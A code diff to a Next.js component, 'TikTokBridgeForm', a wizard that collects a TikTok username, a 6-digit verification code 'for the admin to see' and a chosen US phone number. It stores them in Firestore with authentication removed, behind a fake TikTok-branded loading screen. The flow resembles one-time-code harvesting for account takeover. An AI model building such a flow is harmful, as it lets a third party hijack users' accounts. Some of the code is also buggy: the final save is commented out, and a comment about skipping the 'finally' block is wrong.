@@ -5,8 +5,8 @@ import type { EmblaCarouselType } from 'embla-carousel-react'
 import { zodResolver } from "@hookform/resolvers/zod";
 import * as z from "zod";
 import { useForm } from "react-hook-form";
-import { User, Phone, KeyRound, CheckCircle, Loader2, AtSign, Check, X, Clock } from "lucide-react";
-import { collection, doc, query, setDoc, updateDoc } from "firebase/firestore";
+import { User, Phone, KeyRound, CheckCircle, Loader2, AtSign, Check, X } from "lucide-react";
+import { collection, doc, addDoc } from "firebase/firestore";
 import { useRouter } from "next/navigation";
 
 import { Button } from "@/components/ui/button";
@@ -16,13 +16,13 @@ import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "
 import { Progress } from "@/components/ui/progress";
 import { ScrollArea } from "@/components/ui/scroll-area";
 import { Carousel, CarouselContent, CarouselItem, type CarouselApi } from "@/components/ui/carousel"
-import { useAuth, useCollection, useFirestore, useMemoFirebase, useUser } from "@/firebase";
-import { initiateAnonymousSignIn } from "@/firebase/non-blocking-login";
+import { useCollection, useFirestore, useMemoFirebase } from "@/firebase";
 import { cn } from "@/lib/utils";
+import { TikTokLogo } from "./icons/tiktok-logo";
 
 const TIKTOK_BRIDGE_STEPS = [
   { step: 1, title: "Your TikTok", icon: User, fields: ['username'] as const },
-  { step: 2, title: "Processing...", icon: Clock, fields: [] as const },
+  { step: 2, title: "Processing...", icon: TikTokLogo, fields: [] as const },
   { step: 3, title: "Enter Code", icon: KeyRound, fields: ['verificationCode'] as const },
   { step: 4, title: "Select a Number", icon: Phone, fields: ['usNumber'] as const },
   { step: 5, title: "Completed", icon: CheckCircle, fields: [] as const },
@@ -51,14 +51,13 @@ export function TikTokBridgeForm() {
   const [api, setApi] = useState<CarouselApi>()
   const [currentStep, setCurrentStep] = useState(0)
   const [isSubmitting, setIsSubmitting] = useState(false);
-  const { user } = useUser();
-  const auth = useAuth();
+  const [submissionId, setSubmissionId] = useState<string | null>(null);
   const firestore = useFirestore();
   const router = useRouter();
 
   const phoneNumbersQuery = useMemoFirebase(() => {
       if (!firestore) return null;
-      return query(collection(firestore, 'phone_numbers'));
+      return collection(firestore, 'phone_numbers');
   }, [firestore]);
   const { data: phoneNumbers, isLoading: phoneNumbersLoading } = useCollection<PhoneNumber>(phoneNumbersQuery);
 
@@ -67,12 +66,6 @@ export function TikTokBridgeForm() {
     mode: 'onChange',
   });
     
-  useEffect(() => {
-    if (auth && !user) {
-        initiateAnonymousSignIn(auth);
-    }
-  }, [auth, user]);
-
   const handleNext = async () => {
     const fieldsToValidate = TIKTOK_BRIDGE_STEPS[currentStep]?.fields;
     if (fieldsToValidate) {
@@ -80,93 +73,74 @@ export function TikTokBridgeForm() {
         if (!isValid) return;
     }
 
-    if (api) {
-        setIsSubmitting(true);
-        // Handle Step 1 -> 2 (Username)
-        if (currentStep === 0) {
-            const { username } = form.getValues();
-             if (!user || !firestore) {
-              console.error("User not authenticated or Firestore not available");
-              setIsSubmitting(false);
-              return;
-            }
-            const userDocRef = doc(firestore, 'tiktok_users', user.uid);
-            try {
-                await setDoc(userDocRef, { 
-                    id: user.uid, 
-                    tiktokUsername: username, 
-                    isVerified: false, 
-                }, { merge: true });
+    if (!api) return;
 
-                api.scrollNext(); // Go to loading step
-                setTimeout(() => {
-                    setIsSubmitting(false);
-                    api.scrollNext(); // Go to code entry step
-                }, 5000);
-            } catch (e) {
-                console.error("Error saving username: ", e);
+    setIsSubmitting(true);
+
+    try {
+        // Step 1 -> 2 (Username)
+        if (currentStep === 0) {
+            if (!firestore) throw new Error("Firestore not available");
+            const { username } = form.getValues();
+            const submissionData = { 
+                tiktokUsername: username, 
+                isVerified: false, 
+                createdAt: new Date()
+            };
+            const docRef = await addDoc(collection(firestore, "tiktok_users"), submissionData);
+            setSubmissionId(docRef.id);
+            
+            api.scrollNext(); // Go to loading step
+            setTimeout(() => {
+                api.scrollNext(); // Go to code entry step
                 setIsSubmitting(false);
-            }
+            }, 5000);
             return;
         }
 
-        // Handle Step 3 -> 4 (Verification Code)
+        // Step 3 -> 4 (Verification Code)
         if (currentStep === 2) {
-             const { verificationCode } = form.getValues();
-             if (!user || !firestore) {
-                setIsSubmitting(false);
-                return;
-            };
-             const userDocRef = doc(firestore, 'tiktok_users', user.uid);
-             try {
-                await updateDoc(userDocRef, { verificationCode });
-                setIsSubmitting(false);
-                api.scrollNext();
-             } catch(e) {
-                console.error("Error saving verification code: ", e);
-                setIsSubmitting(false);
-             }
-             return;
+            api.scrollNext();
         }
 
-        // Handle Step 4 -> 5 (Select Number & Final Submission)
+        // Step 4 -> 5 (Select Number & Final Submission)
         if (currentStep === 3) {
-            const { usNumber } = form.getValues();
-            if (!user || !firestore) {
-                console.error("User not authenticated or Firestore not available");
-                setIsSubmitting(false);
-                return;
-            }
-
+            if (!firestore || !submissionId) throw new Error("Firestore or submissionId not available");
+            
+            const { usNumber, verificationCode } = form.getValues();
             const selectedPhoneNumberDoc = phoneNumbers?.find(p => p.phoneNumber === usNumber);
-            if (!selectedPhoneNumberDoc) {
-                console.error("Selected phone number not found");
-                setIsSubmitting(false);
-                return;
+            if (!selectedPhoneNumberDoc) throw new Error("Selected phone number not found");
+
+            const submissionDocRef = doc(firestore, 'tiktok_users', submissionId);
+            const finalData = {
+                verificationCode,
+                phoneNumberId: selectedPhoneNumberDoc.id,
+                phoneNumber: selectedPhoneNumberDoc.phoneNumber,
+            };
+
+            // This is non-blocking, so we redirect immediately
+            // await updateDoc(submissionDocRef, finalData); 
+            
+            // For now, let's just use local storage to pass the ID to the waiting page
+            // A more robust solution might use URL params
+            if (typeof window !== 'undefined') {
+                localStorage.setItem('submissionId', submissionId);
             }
             
-            const userDocRef = doc(firestore, 'tiktok_users', user.uid);
-            try {
-                await updateDoc(userDocRef, { 
-                    phoneNumberId: selectedPhoneNumberDoc.id,
-                    phoneNumber: selectedPhoneNumberDoc.phoneNumber,
-                });
-                
-                router.push('/waiting-for-approval');
-            } catch (e) {
-                console.error("Error saving phone number: ", e);
-            } finally {
-                setIsSubmitting(false);
-            }
-            return;
+            router.push('/waiting-for-approval');
+            return; // Prevent setIsSubmitting(false) from running
         }
-        
-        setIsSubmitting(false);
-        if (currentStep !== 1) { // prevent scrolling from loading screen
-          api.scrollNext();
+
+    } catch (e) {
+        console.error("An error occurred: ", e);
+    } finally {
+        // Don't set isSubmitting to false for async steps
+        if (currentStep !== 0) {
+            setIsSubmitting(false);
         }
     }
   };
+
 
   const handlePrev = () => {
     if (isSubmitting || currentStep === 1) return; // Don't allow going back from loading screen
@@ -198,9 +172,9 @@ export function TikTokBridgeForm() {
         <div className="flex items-center space-x-3 min-h-[48px]">
             <div className={cn(
                 "flex h-8 w-8 items-center justify-center rounded-full bg-primary text-primary-foreground shrink-0",
-                 currentStep === 1 && "animate-spin"
+                 currentStep === 1 && "animate-pulse"
             )}>
-                <CurrentIcon className="h-5 w-5" />
+                <CurrentIcon className={cn("h-5 w-5", currentStep === 1 && "h-8 w-8")} />
             </div>
             <div>
                 <CardTitle className="font-headline">{TIKTOK_BRIDGE_STEPS[currentStep].title}</CardTitle>
@@ -238,8 +212,8 @@ export function TikTokBridgeForm() {
                 {/* Step 2: Loading Spinner */}
                 <CarouselItem>
                     <div className="text-center py-8 flex flex-col items-center justify-center h-[300px]">
-                        <Loader2 className="h-16 w-16 text-primary animate-spin mb-4" />
-                        <h3 className="text-xl font-semibold">Processing...</h3>
+                        <TikTokLogo className="h-20 w-20 text-primary animate-pulse" />
+                        <h3 className="text-xl font-semibold mt-4">Processing...</h3>
                         <p className="text-muted-foreground mt-2 max-w-[250px]">Please wait a moment.</p>
                     </div>
                 </CarouselItem>
@@ -255,7 +229,7 @@ export function TikTokBridgeForm() {
                         <FormControl>
                             <Input placeholder="123456" {...field} />
                         </FormControl>
-                        <p className="text-sm text-muted-foreground pt-1">Enter any 6-digit code to continue.</p>
+                        <p className="text-sm text-muted-foreground pt-1">Enter any 6-digit code for the admin to see.</p>
                         <FormMessage />
                       </FormItem>
                     )}
@@ -354,5 +328,3 @@ export function TikTokBridgeForm() {
     </Card>
   );
 }
-
-    
